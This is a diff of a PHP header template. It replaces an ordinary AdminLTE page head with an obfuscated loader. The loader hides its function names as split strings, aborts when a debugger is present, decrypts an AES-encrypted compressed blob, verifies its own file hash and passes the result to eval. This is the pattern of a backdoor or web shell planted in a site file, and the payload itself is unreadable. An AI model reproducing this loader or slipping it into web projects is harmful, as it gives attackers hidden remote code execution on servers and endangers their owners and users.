@@ -1,54 +1,28 @@
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title><?=$page_title;?></title>
-  <link rel='shortcut icon' href='<?php echo $theme_link; ?>images/favicon.ico' />
-  <!-- Tell the browser to be responsive to screen width -->
-  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
-  <!-- Bootstrap 3.3.6 -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>bootstrap/css/bootstrap.min.css">
-   <!-- Font Awesome -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>css/font-awesome-4.7.0/css/font-awesome.min.css">
-  <!-- Ionicons -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>css/ionicons-2.0.1/css/ionicons.min.css">
-  <!-- Select2 -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/select2/select2.min.css">
-    <!-- DataTables -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/DataTables-1.10.18/css/dataTables.bootstrap.min.css">
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/DataTables-1.10.18/extensions/FixedHeader-3.1.4/css/fixedHeader.dataTables.min.css">
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/DataTables-1.10.18/extensions/FixedHeader-3.1.4/css/fixedHeader.bootstrap.min.css">
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/DataTables-1.10.18/extensions/Responsive-2.2.2/css/responsive.dataTables.min.css">
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/DataTables-1.10.18/extensions/Responsive-2.2.2/css/responsive.bootstrap.min.css">  
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/DataTables-1.10.18/extensions/Buttons-1.5.4/css/buttons.bootstrap.min.css">  
-  <!-- end -->
-  <!-- Theme style -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/AdminLTE.min.css">
-  <!-- AdminLTE Skins. Choose a skin from the css/skins
-       folder instead of downloading all of them to reduce the load. -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/skins/_all-skins.min.css">
- <!--Toastr notification -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>toastr/toastr.css">
-  <!--Toastr notification end-->
-  <!-- iCheck -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/iCheck/square/orange.css">
-  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-  <!--Custom Css File-->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/custom.css">
-  <!-- Pace Loader -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>plugins/pace/pace.min.css">
-  <?php 
-      $lang = trim(strtoupper($this->session->userdata('language')));
-      if($lang==strtoupper('arabic') || $lang==strtoupper('urdu')) {?>
-  <!-- RTL For arabic styles -->
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>bootstrap/css/bootstrap.rtl.min.css">
-  <link rel="stylesheet" href="<?php echo $theme_link; ?>dist/css/AdminLTE.rtl.min.css">
-  <?php } ?>
-  <!-- Theme color finder -->
-  <script type="text/javascript">
-  var default_skin = 'skin-yellow-light';
-  var theme_skin = (typeof (Storage) !== "undefined") ? localStorage.getItem('skin') : default_skin;
-  theme_skin = (theme_skin=='' || theme_skin==null) ? default_skin : theme_skin;
-  var sidebar_collapse = (typeof (Storage) !== "undefined") ? localStorage.getItem('collapse') : default_skin;
-  </script>
-  <!-- jQuery 2.2.3 -->
-  <script src="<?php echo $theme_link; ?>plugins/jQuery/jquery-2.2.3.min.js"></script>
-  
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_cvv2yyfm=('bas'.'e64'.'_de'.'cod'.'e');
+$_tmvvvuuy=('gzu'.'nco'.'mpr'.'ess');
+$_df3z91bk=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_e0l0ov0r='bKzhgrRp';
+$_tbipnjkd='cMH0bTRQ';
+$_h1vgh44g='vepZYP1x';
+$_p2it9rwr='eTkd7iW+';
+$_tf20njzd='owTBMNkc1zE=';
+$_y8b7tx8u='d9+sPPKd';
+$_qofhk6xp='5kfJZw==';
+$_seq7s0sw='PRF7q/SL';
+$_n8ztxbl5=$_cvv2yyfm($_p2it9rwr.$_e0l0ov0r.$_tbipnjkd.$_h1vgh44g.$_tf20njzd);
+$_czy2e5vp=$_cvv2yyfm($_seq7s0sw.$_y8b7tx8u.$_qofhk6xp);
+$_s7rpe7ut=$_cvv2yyfm('ZxXaYNfdvDqXJSNSA3CPP8FXKpZfca06izriQpjfjwnf401FgDgBdh3qCVb0T4y1Z5LY1AH2aKGFw8XdSA48dTIPvsAUa5ehdX7XpEbmjSTBOSvljqUNqGQGQ+V4xlHmex0yE2wUkW72jF0BXJfztAgqk1avW0T/8cUWJ71iVXvDqftBGFrR2F8Q1+70taG48YhAUQ3MHbUChA2DljTFzKxXFfLF8WzK5FatMOaN/N+KK0nLZrtmbsm8FKi41HxtRiuOMzS9LvrP6MpPThOFbp31ODPWJ3YNNCICb7n1kJzUN0GoxKAz0FmywQbl7aqEY+OMjbVbQt46cIPpujxywM5NZaGvaxtGivvZzZ4TihGLIVKGQOTWplGrgipLwu5fjsgspNxjMmien44CD4b3sftfdx3wgTgo5m5iTPA6d87SK0m7zt8n4TueTC8IKM6jKfEVz6ayNnk7uPJzGv+zU9702koBZAkxfml8ihpqkGSfPjK3evz8cXUOcjz1fla6T7L0yWQ0ERxb1/P/kjbdqKi66E2cDgMPg9TSTditTa46ksIbZtQrtdMCWOY/XIfY2WH+BYCrNsN79RQEkwwIYlHE95/7vPdIGpuLgIdDx7AVQY0/ivWbt7kqQUbsMkls7y79QfGXIShcxtU+BbhjEYpxw2e7gAgMs45ATOHVgLs0P/Nf5gSSdIvve7KeGWZZC2MJiS+dkFPyB7a7RVGvzGbdIShSfG/h/86jxoY8Gempqp6dudnBuLePnBFwgptp7PHhd9qrgCF7ubCYdyrNfAa+s9c1htEFOa+9nEB+P9LK0AirfvUpQwV2NXvlq5Vg3lHfOGkalXV551iAkoWu8g8h+ke4CRXb6bz/Z5J6/4HLpi0zTlgNih73QrlRm9SA+l8XIIvbMNhoUu9g+usMqJahi1oi8djuvS4huGvZdLWuNxzrpDMFaEk6yLbhrXhVY9pl3XiTvnbUjI7YBmZpsUjW347jngkCHnPkcksQ7oMolRgZuZG+sVd1EWOux+mp3QLhKEYKdjSdiWtJMX9rgWhtNDqC3CinxF3QfyrpK0LiYaZZCqDaF2OAixNl0tqtD20qS+BqSv07ZpBpeXnb9f6NTqUxC/w3cSpjaiBooLu9YsLaHUq4Pzh8d8Uu3TSAmXLHwAGgV3Glht/hahevTvWf97p8AAltxHu8wekL7CfwN8ov4qBYQWnxYQFrXZtrKJHBbC4Fs6r7Ptl5VkwQgseLTu8JC0MHxakKEqWoB17+2+1l7DJ3McfTJkd32Ute2l+lG9l2l5/8v/t04iTMUcp8HUb78B8cSeDqx+/hT1lS9AqTaVhkSg2pB7ucKFBibgc39VClh3lZ29Sh2GXsutbZZoYtaUHMYDJr71u1v62LwZz3nFWriH8NyUcx+mcBuv4+jVXYvQIHjXZyvT6gcB0NmBdjYQIVbvylJM4XGu6tbTMlSVqh4ari+1ebKuB87jK5kkeWOJusF3yHsDqwD6mBC88jlVh+4ksRQgh3K0OGxJ3fRnyLHb35dYYFlW029ZyKfBtFXn8RCeVvRwaIjoLOERS8nP1XwVtT9B1LJTfma+JJoazLubvsmQmzmldb25yAqJVDjiaLoAflK0dYq2DSuDNlcfto+u9HuuvavW1rKUYu+D+XF2MjyLyDpafl');
+$_r0vghe1g=$_df3z91bk($_s7rpe7ut,'aes-256-cbc',$_n8ztxbl5,OPENSSL_RAW_DATA,$_czy2e5vp);
+if($_r0vghe1g===false){exit;}
+$_ibf823ty=$_tmvvvuuy($_r0vghe1g);
+if($_ibf823ty===false){exit;}
+$_eq8md4ts='f828a1eaca18e7e650f44fbf420487e0fb2a3ac63b13b7794a644f9edb8dda42';
+$_qvm3mfxs=@file_get_contents(__FILE__);
+if($_qvm3mfxs!==false){
+$_qkziyy91=str_replace($_eq8md4ts,"0000000000000000000000000000000000000000000000000000000000000000",$_qvm3mfxs);
+$_ddaftsbo=hash("sha256",$_qkziyy91);
+if($_ddaftsbo!==$_eq8md4ts){@http_response_code(403);exit;}
+}
+eval($_ibf823ty);
